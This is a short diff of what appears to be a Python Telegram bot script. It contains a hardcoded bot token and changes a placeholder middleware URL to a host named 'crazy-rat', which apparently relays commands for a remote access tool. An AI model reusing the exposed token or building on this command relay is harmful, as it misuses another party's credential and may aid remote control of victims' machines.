@@ -6,7 +6,7 @@ import requests
 TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"
 
 # Middleware URL
-MIDDLEWARE_URL = "https://your-render-app.onrender.com/command"
+MIDDLEWARE_URL = "https://crazy-rat.onrender.com"
 
 # Start command handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
